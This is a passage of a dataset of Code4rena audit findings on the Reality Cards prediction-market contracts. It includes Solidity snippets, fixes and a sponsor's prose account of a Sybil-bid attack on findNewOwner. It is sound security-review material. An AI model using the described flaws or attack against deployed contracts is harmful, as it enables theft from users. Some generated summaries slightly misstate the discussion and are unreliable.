      "content": "_Submitted by tensors_\n\nThe Uber Owner has too much power within the system. This makes the protocol closer to a centralized prediction market whose rules are determined by the Uber Owner. See issue page for referenced code\n\nThe above functions can be used by the Uber Owner to completely change the functionality of the system.\nThis goes well beyond simple setting new constants and fees, the Uber Owner can basically reprogram how the entire protocol works. Not to mention if the address falls into the wrong hands.\n\nRecommend limiting the permission of the Uber Owner to something more manageable and trustable. If upgrades to underlying contracts are required they can be done through a proxy instead, in the standard way.\n\n**[mcplums (Reality Cards) disputed](https://github.com/code-423n4/2021-08-realitycards-findings/issues/74#issuecomment-906225388):**\n > This is a subjective opinion- there is always going to be a compromise between decentralisation and the ability to respond to potential problems. The latter is especially important with a protocol that is so new.\n>\n> There is no correct answer here, but the current abilities of `uberOwner` were decided after a lot of thought and are in line with other DeFi protocols.\n\n**[Splidge (Reality Cards) commented](https://github.com/code-423n4/2021-08-realitycards-findings/issues/74#issuecomment-906236023):**\n > I'd just like to add that we did recognize the power of the UberOwner which is why it is separated from the Owner specifically so that we can add additional security to it (in the form of a multisig) and so that we can relinquish this control at the appropriate time.\n> This was covered in the [readme](https://github.com/code-423n4/2021-08-realitycards#mortar_board-governance-mortar_board).\n> And also [commented ](https://github.com/code-423n4/2021-08-realitycards/blob/39d711fdd762c32378abf50dc56ec51a21592917/contracts/RCTreasury.sol#L288-L291)in the code.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-08-realitycards-findings/issues/74#issuecomment-911717998):**\n > I think the warden(s) have a valid point here. This is an incredible amount of power for a single address to yield over the protocol, even if backed by a multi-sig.\n>\n> Is it no an option to 1) pause all activity, and unlock all funds allowing users to withdraw their own funds or 2) pause all activity besides withdraws and implement a time delay between that and the \"rug pull\" function being called.\n>\n> The readme also states\n>\n> ```Alternatively we may wish for this to be a multisig but the normal owner to not be, for convenience.```\n>\n> Without a multisig, I believe this absolutely qualifies as a high severity issue as a compromise of a single end user address compromises the entire system, with a multisig it potentially lowers the severity down to a medium, but its still a risk that is worth highlighting in the system and for the sponsor to scrutinize if there are indeed other mitigation paths that could be taken.\n\n",
      "summary": "\nThe bug report is about the Uber Owner having too much power in the system of Reality Cards, a decentralized prediction market. This means that the owner has the ability to change the rules and functionality of the protocol, which could be problematic if the owner's address falls into the wrong hands. The report recommends limiting the power of the Uber Owner and using a proxy for any necessary upgrades. The issue has been disputed by the Reality Cards team, who believe that the current abilities of the Uber Owner were carefully considered and are in line with other DeFi protocols. However, the warden (judge) believes that the power of the Uber Owner is still a valid concern and suggests implementing a time delay or using a multisig for added security.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/74",
      "tags": [],
      "finders": []
    },
    {
      "id": "42274",
      "title": "[H-01] `findNewOwner` edgecase",
      "impact": "HIGH",
      "content": "_Submitted by gpersoon_\n\nIn the function `findNewOwner` of `RCOrderbook`, as loop is done which included the check  `_loopCounter < maxDeletions`\nAfterwards, a check is done for  \"(_loopCounter != maxDeletions)\" to determine if the processing is finished.\nIf `_loopCounter == maxDeletions` then the conclusion is that it isn't finished yet.\n\nHowever, there is the edgecase that the processing might just be finished at the same time as `_loopCounter == maxDeletions`.\n\nYou can see this the best if you assume `maxDeletions==1`, in that case it will never draw the conclusion it is finished.\nOf course having `maxDeletions==1` is very unlikely in practice.\n\n```solidity\n// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCOrderbook.sol#L549\n function findNewOwner(uint256 _card, uint256 _timeOwnershipChanged)  external  override  onlyMarkets  {\n...\n    // delete current owner\n    do {\n        _newPrice = _removeBidFromOrderbookIgnoreOwner( _head.next, _market, _card );\n        _loopCounter++;             // delete next bid if foreclosed\n    } while (    treasury.foreclosureTimeUser( _head.next, _newPrice,  _timeOwnershipChanged ) <  minimumTimeToOwnTo &&\n            _loopCounter < maxDeletions );\n\n    if (_loopCounter != maxDeletions) {   // the old owner is dead, long live the new owner\n        _newOwner = ....\n        ...\n    } else {\n        // we hit the limit, save the old owner, we'll try again next time\n        ...\n    }\n}\n```\n\nRecommend using a different way to determine that the processing is done. This could save some gas.\nNote: the additional check also costs gas, so you have to verify the end result.\n\nPerhaps in `setDeletionLimit`, doublecheck that `_deletionLimit` > 1.\n\n**[Splidge (Reality Cards) confirmed and disagreed with severity](https://github.com/code-423n4/2021-08-realitycards-findings/issues/27#issuecomment-905499584):**\n > oh wow, this is actually a really big problem. It's easier to see it if `maxDeletions` is 1 but it exists with any size of `maxDeletions`.\n> Whenever we find a valid owner on the final iteration of the loop the if statement will simply check if it was the final loop. That valid owner is then assumed to be invalid and saved for the next transaction to try and find a new owner. When that next transaction happens the valid owner is immediately deleted and not given any ownership of the card at all.\n> I think this just falls short of 3 (High risk) because I don't think it'd be possible for an attacker to engineer the situation to have a particular user deleted without ownership. But I believe this would count as 2 (Med risk) because the protocol [\"availability could be impacted\"](https://docs.code4rena.com/roles/wardens/judging-criteria#estimating-risk-tl-dr) for the user that is deleted.\n\n**[Splidge (Reality Cards) commented](https://github.com/code-423n4/2021-08-realitycards-findings/issues/27#issuecomment-905523120):**\n > I have since thought of an attack that could have used this and might raise it to 3 (High risk).\n>\n> Due to the difficultly of monitoring which cards you own all the time a valid strategy which some users employ is to bid high enough to scare off other users (usually bidding significantly beyond the 10% minimum increase). Suppose Alice employs this strategy by bidding \\$100 on a card that was previously only \\$10.\n> Mal (our attacker) wishes to rent the card but wants to pay less than \\$100. Mal could use Sybil accounts to place `maxDeletions - 1` bids all for the minimum rental duration (only funding the accounts for the minimum duration). Mal would then need to wait for the minimum duration of all these bids to expire, `(maxDeletions - 1 ) * minimumRentalDuration`\n> Once this has completed Mal can place a bid at \\$11, this will trigger a rent collection which will attempt to `findNewOwner`, Alice being the user that was found on the last iteration of the loop would be considered as invalid. There will not be a change of ownership or any events emitted about this until the next rent collection is triggered.\n> This means that the UI would still consider Alice to be the owner of card (Mals' Sybil bids having had `LogRemoveFromOrderbook` and `LogUserForeclosed` events emitted) and other users might not consider trying to outbid this, whereas actually Mal is accruing time at a significantly cheaper rate.\n>\n> Thinking about it, this doesn't really even need Alice at all, Mal could have placed all the higher bids to simultaneously scare off other users while renting at a lower price.\n>\n> I think the fix is relatively simple, by checking if we found a valid user OR hit the deletion limit we can make it so that we don't skip any bids. This would then leave Alice (or Mal in the other version) correctly having to pay for the time at the higher price.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-08-realitycards-findings/issues/27#issuecomment-911673904):**\n > upgrading based on sponsors analysis\n\n**[Splidge (Reality Cards) patched](https://github.com/code-423n4/2021-08-realitycards-findings/issues/27#issuecomment-914180653):**\n > Fixed [here](https://github.com/RealityCards/RealityCards-Contracts/commit/9f81f683ea0d2ab41ab91ba9188baf594012c295)\n\n",
      "summary": "\nThe bug report highlights an issue in the `findNewOwner` function of the `RCOrderbook` contract. The function includes a loop that checks if the loop counter is less than the maximum number of deletions. However, there is a possibility that the processing may be finished at the same time as the loop counter reaching the maximum number of deletions. This can lead to incorrect conclusions being drawn and potentially impact the availability of the user affected. The severity of the bug is debated, with some experts suggesting it may be a high risk. The suggested fix is to check for a valid user or if the deletion limit has been reached, to ensure no bids are skipped. The issue has been patched in the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/27",
      "tags": [],
      "finders": []
    },
    {
      "id": "5240",
      "title": "[M-03] Deposits don’t work with fee-on transfer tokens",
      "impact": "MEDIUM",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\nThere are ERC20 tokens that may make certain customizations to their ERC20 contracts.\nOne type of these tokens is deflationary tokens that charge a certain fee for every `transfer()` or `transferFrom()`.\nOthers are rebasing tokens that increase in value over time like Aave's aTokens (`balanceOf` changes over time).\n\n\n## Impact\nThe `RCTreasury.deposit()` function will credit more deposits than the contract actually received:\n\n```\nerc20.safeTransferFrom(msgSender(), address(this), _amount);\nuser[_user].deposit += SafeCast.toUint128(_amount);\n```\n\n## Recommended Mitigation Steps\nEnsure that the `erc20` token does not implement any customizations.\nAlternatively, a mitigation is to measure the asset change right before and after the asset-transferring routines",
      "summary": "\nThis bug report is about an issue with the `RCTreasury.deposit()` function. This function is used to credit deposits to a user, however, it is possible for it to credit more deposits than the contract actually received. This is due to the fact that some ERC20 tokens may have customizations, such as deflationary tokens that charge a fee for every `transfer()` or `transferFrom()`. To prevent this issue, it is recommended to ensure that the ERC20 token does not implement any customizations, or alternatively to measure the asset change right before and after the asset-transferring routines.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/58",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "680",
      "title": "[L-25] Use _safeTransfer when transferring NFTs",
      "impact": "LOW",
      "content": "## Handle\n\nshw\n\n\n## Vulnerability details\n\n## Impact\n\nThe `transferNft` function of `RCNftHubL2` is called when transferring the card to the final winner. However, this function does not check whether the recipient is aware of the ERC721 protocol and calls `_transfer` directly. If the recipient is a contract not aware of incoming NFTs, then the transferred NFT would be locked in the recipient forever.\n\n## Proof of Concept\n\nReferenced code:\n[RCNftHubL2.sol#L135](https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/nfthubs/RCNftHubL2.sol#L135)\n\n## Recommended Mitigation Steps\n\nUse the [`_safeTransfer`]((https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L205-L213)) function instead, which checks if the recipient contract implements the `onERC721Received` interface to avoid loss of NFTs.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/65",
      "tags": [],
      "finders": [
        "shw"
      ]
    },
    {
      "id": "679",
      "title": "[L-24] RCLeaderboard: Erroneous comment",
      "impact": "LOW",
      "content": "## Handle\n\nhickuphh3\n\n\n## Vulnerability details\n\n### Impact\n\nThe comments above the event declarations were probably copied over from RCOrderbook. They should be modified to refer to the leaderboard.\n\n### Recommended Mitigation Steps\n\n```jsx\n/// @dev emitted every time a user is added to the leaderboard\nevent LogAddToLeaderboard(address _user, address _market, uint256 _card);\n/// @dev emitted every time a user is removed from the leaderboard\nevent LogRemoveFromLeaderboard(\n    address _user,\n    address _market,\n    uint256 _card\n);\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/43",
      "tags": [],
      "finders": [
        "hickuphh3"
      ]
    },
    {
      "id": "678",
      "title": "[L-23] Inaccurate Comment",
      "impact": "LOW",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\nThis issue has no direct security implications, however, there may be some confusion when understanding what the `RCFactory.createMarket()` function actually does.\n\n## Proof of Concept\nhttps://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCFactory.sol#L625\n\n## Tools Used\n\nManual code review\n\n## Recommended Mitigation Steps\n\nUpdate the line (linked above) to include the `SAFE_MODE` option outline in the `enum` type in `IRCMarket.sol`. For example, the line `/// @param _mode 0 = normal, 1 = winner takes all` could be updated to `/// @param _mode 0 = normal, 1 = winner takes all, 2 = SAFE_MODE`",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/16",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "677",
      "title": "[L-22] transferCard should be done after treasury is updated.",
      "impact": "LOW",
      "content": "## Handle\n\n0xImpostor\n\n\n## Vulnerability details\n\n## Impact\n\nWhen the current owner of the card is still the new owner of the card, `transferCard` is called before the treasury is updated. While this does not currently pose a risk, it is not aligned with best practices of [check-effect-interations](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html) and opens your code to a potential re-entrancy attack in the future.\n\n## Tools Used\n\nManual analysis\n\n## Recommended Mitigation Steps\n\n```jsx\n// line 381\ntreasury.updateRentalRate(\n    _oldOwner,\n    _user,\n    user[_oldOwner][index[_oldOwner][_market][_card]].price,\n    _price,\n    block.timestamp\n);\ntransferCard(_market, _card, _oldOwner, _user, _price);\n...\n// line 449\ntreasury.updateRentalRate(\n    _user,\n    _user,\n    _price,\n    _currUser.price,\n    block.timestamp\n);\ntransferCard(_market, _card, _user, _user, _currUser.price);\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/35",
      "tags": [],
      "finders": [
        "0xImpostor"
      ]
    },
    {
      "id": "676",
      "title": "[L-21] no time restriction in setMarketTimeRestrictions()",
      "impact": "LOW",
      "content": "## Handle\n\nJMukesh\n\n\n## Vulnerability details\n\n## Impact\n\nas mentioned in the comment , time must be at least  this much second, but it lack those check that given time is  atleast >= someTime ,  as a result \n minimumDuration,   maximumDuration are directly initialized without any check\n\n\n\n## Proof of Concept\nhttps://github.com/code-423n4/2021-08-realitycards/blob/39d711fdd762c32378abf50dc56ec51a21592917/contracts/RCFactory.sol#L431\n\n## Tools Used\nmanual review\n\n## Recommended Mitigation Steps\nadd require condition to check those value before setting it",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/49",
      "tags": [],
      "finders": [
        "JMukesh"
      ]
    },
    {
      "id": "675",
      "title": "[L-20] No check for the referenceContractAddress in createMarket()",
      "impact": "LOW",
      "content": "## Handle\n\nJMukesh\n\n\n## Vulnerability details\n\n## Impact\n\n referenceContractAddress  is used in createMarket() to create newAddress  for the market , a necessary check should be there that referenceContractAddress exist or not, because if createMarket() is called before setReferenceContractAddress() address(0) will be passed as referenceContractAddress , since addMarket() of treasury and nfthub does not have address validation for the market\n\n## Proof of Concept\nhttps://github.com/code-423n4/2021-08-realitycards/blob/39d711fdd762c32378abf50dc56ec51a21592917/contracts/RCFactory.sol#L714\n\n## Tools Used\n\nmanual review\n\n## Recommended Mitigation Steps\n\nadd a condition to check the referenceContractAddress",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/50",
      "tags": [],
      "finders": [
        "JMukesh"
      ]
    },
    {
      "id": "674",
      "title": "[L-19] use of array without checking its length",
      "impact": "LOW",
      "content": "## Handle\n\nJMukesh\n\n\n## Vulnerability details\n\n## Impact\nsince no limit is mentioned in  batchWhitelist() for the input of _users array , it may run out of gas if array length become large\n\n## Proof of Concept\nhttps://github.com/code-423n4/2021-08-realitycards/blob/39d711fdd762c32378abf50dc56ec51a21592917/contracts/RCTreasury.sol#L249\n\n## Tools Used\nmanual review\n\n## Recommended Mitigation Steps\nadd a limitation for which , this number of address can be whitelisted at a time",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/60",
      "tags": [],
      "finders": [
        "JMukesh"
      ]
    },
    {
      "id": "673",
      "title": "[L-18] add zero address validation in constructor",
      "impact": "LOW",
      "content": "## Handle\n\nJMukesh\n\n\n## Vulnerability details\n\n## Impact\nsince the parameter in the constructor are used to initialize the state variable , proper check up should be done , other wise error in these state variable  can lead to redeployment of contract\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-08-realitycards/blob/39d711fdd762c32378abf50dc56ec51a21592917/contracts/RCLeaderboard.sol#L50\n\nhttps://github.com/code-423n4/2021-08-realitycards/blob/39d711fdd762c32378abf50dc56ec51a21592917/contracts/RCOrderbook.sol#L136\n\nhttps://github.com/code-423n4/2021-08-realitycards/blob/39d711fdd762c32378abf50dc56ec51a21592917/contracts/RCTreasury.sol#L120\n\n## Tools Used\nmanual review\n\n## Recommended Mitigation Steps\nadd zero address validation",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/61",
      "tags": [],
      "finders": [
        "cmichel",
        "JMukesh"
      ]
    },
    {
      "id": "672",
      "title": "[L-17] Markets can start in the past",
      "impact": "LOW",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\nThe `RCFactory._checkTimestamps` function only checks that the start timestamp (`_timestamps[0]`) is not in the past if `advancedWarning != 0`.\n\n## Impact\nMarkets can be created that already started in the past.\nI'm not sure if this is intended.\n\n## Recommended Mitigation Steps\nAlways perform the `require(_timestamps[0] >= block.timestamp, \"Market opening time not set\");` check, not only in the `advancedWarning != 0` case.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/54",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "671",
      "title": "[L-16] RCLeaderboard.market storage variable is not used",
      "impact": "LOW",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\nThe `RCLeaderboard.market` storage variable is never used.\nInstead, the `MARKET` role seems to be used to implement authentication.\n\n## Impact\nUnused code can hint at programming or architectural errors.\n\n## Recommended Mitigation Steps\nUse it or remove it.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/55",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "670",
      "title": "[L-15] RCTreasury: AccessControl diagram contains Leaderboard, but it has no role",
      "impact": "LOW",
      "content": "## Handle\n\nhickuphh3\n\n\n## Vulnerability details\n\n### Impact\n\n```jsx\n/* setup AccessControl\n\n                 UBER_OWNER\n    ┌───────────┬────┴─────┬────────────┬─────────┐\n    │           │          │            │         │\n  OWNER      FACTORY    ORDERBOOK   TREASURY  LEADERBOARD\n    │           │\n GOVERNOR     MARKET\n    │\n WHITELIST | ARTIST | AFFILIATE | CARD_AFFILIATE\n*/\n```\n\nFrom this diagram, one might expect the existence of a `LEADERBOARD` role, but there is no such role. It should be removed from the diagram.\n\n### Recommended Mitigation Steps\n\n```jsx\n/* setup AccessControl\n\n                 UBER_OWNER\n    ┌───────────┬────┴─────┬────────────┐\n    │           │          │            │         \n  OWNER      FACTORY    ORDERBOOK   TREASURY\n    │           │\n GOVERNOR     MARKET\n    │\n WHITELIST | ARTIST | AFFILIATE | CARD_AFFILIATE\n*/\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/44",
      "tags": [],
      "finders": [
        "leastwood  cmichel",
        "hickuphh3"
      ]
    },
    {
      "id": "669",
      "title": "[L-14] updateTokenURI doesn’t call setTokenURI ",
      "impact": "LOW",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nThe function updateTokenURI of RCFactory.sol doesn't update the uris of RCNftHubL2.\nE.g. it doesn't call setTokenURI to try and update the already created NFT's.\nThis way the URIs of already minted tokens are not updated.\n\n## Proof of Concept\n// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCFactory.sol#L453\n function updateTokenURI(\n\n// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/nfthubs/RCNftHubL2.sol#L101\nfunction setTokenURI(uint256 _tokenId, string calldata _tokenURI) external onlyUberOwner {\n        _setTokenURI(_tokenId, _tokenURI);\n    }\n\n## Tools Used\n\n## Recommended Mitigation Steps\nAlso call setTokenURI of RCNftHubL2\nOr restrict updateTokenURI to the phase where no NFT's are minted yet.\nOr at least add comments to updateTokenURI",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/12",
      "tags": [],
      "finders": [
        "gpersoon"
      ]
    },
    {
      "id": "668",
      "title": "[L-13] getMostRecentMarket can revert",
      "impact": "LOW",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nThe function getMostRecentMarket of RCFactory.sol will revert if no markets of the specific mode are created yet.\n\n## Proof of Concept\n// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCFactory.sol#L171\n    function getMostRecentMarket(IRCMarket.Mode _mode)  external view override  returns (address)\n    {\n        return marketAddresses[_mode][marketAddresses[_mode].length - (1)];\n    }\n\n\n## Tools Used\n\n## Recommended Mitigation Steps\nChange the function getMostRecentMarket to something like:\n\nfunction getMostRecentMarket(IRCMarket.Mode _mode)  external view override  returns (address) {\n     if ( marketAddresses[_mode].length ==0) return address(0);\n     return marketAddresses[_mode][marketAddresses[_mode].length - (1)];\n}",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/13",
      "tags": [],
      "finders": [
        "gpersoon"
      ]
    },
    {
      "id": "667",
      "title": "[L-12] rentAllCards: don’t have to pay for card you already own",
      "impact": "LOW",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nThe function rentAllCards of RCMarket checks for _maxSumOfPrices to see you are not paying more that you want.\n\nHowever the first part of the calculations (which calculate _actualSumOfPrices ), do not take in account the fact that you might \nalready own a card. (while the second part of the code does).\nIf you already own the card you don't have to pay for it and you certainly don't have to pay the extra minimumPriceIncreasePercent.\n\nThe code at \"Proof of Concept\" shows a refactored version of the code (see other issue \"make code of rentAllCards easier to read\").\nThis immediately shows the issue.\n\n## Proof of Concept\n// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCMarket.sol#L691 ==> simplified version\n function calc(uint256 currentPrice) returns(uint256) {\n        if (currentPrice == 0) \n            return MIN_RENTAL_VALUE;\n        return (currentPrice *(minimumPriceIncreasePercent + 100)) / 100;\n    }\n    \n    function rentAllCards(uint256 _maxSumOfPrices) external override {\n      ..\n        uint256 _actualSumOfPrices = 0;\n        for (uint256 i = 0; i < numberOfCards; i++) {\n            _actualSumOfPrices += calc(card[i].cardPrice);   // no check for  (ownerOf(i) != msgSender()) {\n        }\n        require(_actualSumOfPrices <= _maxSumOfPrices, \"Prices too high\");\n\n        for (uint256 i = 0; i < numberOfCards; i++) {\n            if (ownerOf(i) != msgSender()) {\n                uint256 _newPrice=calc(card[i].cardPrice);\n                newRental(_newPrice, 0, address(0), i);\n            }\n        }\n    }\n\n## Tools Used\n\n## Recommended Mitigation Steps\nAdd \"if (ownerOf(i) != msgSender()) {\" also in the first part of the code of rentAllCards\n\n        uint256 _actualSumOfPrices = 0;\n        for (uint256 i = 0; i < numberOfCards; i++) {\n             if (ownerOf(i) != msgSender()) {              // extra if statement\n                 _actualSumOfPrices += calc(card[i].cardPrice);   \n             }\n        }",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/21",
      "tags": [],
      "finders": [
        "gpersoon"
      ]
    },
    {
      "id": "666",
      "title": "[L-11] msgSender() or _msgSender()",
      "impact": "LOW",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nThe code has two implementations of msgSender: \n-   msgSender() => uses meta transaction signer\n-  _msgSender() => maps to msg.sender\n\n_msgSender() is used in a few locations\n- when using _setupRole, this seems legitimate\n- in function withdraw  (whereas the similar function withdrawWithMetadata uses msgSender() )\n\nIt is confusing to have multiple functions with almost the same name, this could easily lead to mistakes.\n\n## Proof of Concept\n// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/lib/NativeMetaTransaction.sol#L105\n function msgSender() internal view returns (address payable sender) {\n        if (msg.sender == address(this)) {\n            assembly {   sender := shr(96, calldataload(sub(calldatasize(), 20)))   }\n        } else {\n             sender = payable(msg.sender);\n        }\n        return sender;\n    }\n\n// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Context.sol\n  function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n//https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/nfthubs/RCNftHubL2.sol#L164\n  function withdraw(uint256 tokenId) external override {\n        require(  _msgSender() == ownerOf(tokenId), \"ChildMintableERC721: INVALID_TOKEN_OWNER\" ); // _msgSender() \n        withdrawnTokens[tokenId] = true;\n        _burn(tokenId);\n    }\n\n    function withdrawWithMetadata(uint256 tokenId) external override {\n        require( msgSender() == ownerOf(tokenId), \"ChildMintableERC721: INVALID_TOKEN_OWNER\" );  // msgSender() \n        withdrawnTokens[tokenId] = true;\n        // Encoding metadata associated with tokenId & emitting event\n        emit TransferWithMetadata( ownerOf(tokenId), address(0), tokenId, this.encodeTokenMetadata(tokenId) );\n        _burn(tokenId);\n    }\n\nRCNftHubL1.sol:      _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());\nRCNftHubL2.sol:      _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());\nRCTreasury.sol:        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());\nRCTreasury.sol:        _setupRole(UBER_OWNER,               _msgSender());\nRCTreasury.sol:        _setupRole(OWNER,                         _msgSender());\nRCTreasury.sol:        _setupRole(GOVERNOR,                   _msgSender());\nRCTreasury.sol:        _setupRole(WHITELIST,                    _msgSender());\n\n## Tools Used\ngrep\n\n## Recommended Mitigation Steps\nDoublecheck the use of  _msgSender() in withdraw and adjust if necessary.\n\nAdd comments when using  _msgSender() \n\nConsider overriding _msgSender(), as is done in the example below:\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/metatx/ERC2771Context.sol",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/22",
      "tags": [],
      "finders": [
        "gpersoon"
      ]
    },
    {
      "id": "665",
      "title": "[L-10] uint32 conversion doesn’t work as expected.",
      "impact": "LOW",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nThe uint32 conversion in setWinner of the RCMarket doesn't work as expected.\nThe first statement: \"uint32(block.timestamp)\" already first the block.timestamp in a uint32.\nIf it is larger than type(uint32).max it wraps around and starts with 0 again\nThe testcode below shows this.\n\nCheck for \"<= type(uint32).max\" in the second statement is useless because _blockTimestamp is always  <= type(uint32).max\n\n## Proof of Concept\n// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCMarket.sol#L507\n function setWinner(uint256 _winningOutcome) internal {\n...\n            uint256 _blockTimestamp = uint32(block.timestamp);\n            require(_blockTimestamp <= type(uint32).max, \"Overflow\");\n\n\n//Testcode:\npragma solidity 0.8.7;\ncontract Convert {\n   uint256 public a = uint256( type(uint32).max )+1; // a==4294967296\n   uint32  public b = uint32(a); // b==0\n   uint256 public c = uint32(a); // c==0\n}\n   \n## Tools Used\n\n## Recommended Mitigation Steps\nDo the require first (without a typecast to uint32):\n\n            require( block.timestamp <= type(uint32).max, \"Overflow\");\n            uint256 _blockTimestamp = uint32(block.timestamp);",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/28",
      "tags": [],
      "finders": [
        "gpersoon",
        "0xsanson"
      ]
    },
    {
      "id": "664",
      "title": "[L-09] safer implementation of tokenExists",
      "impact": "LOW",
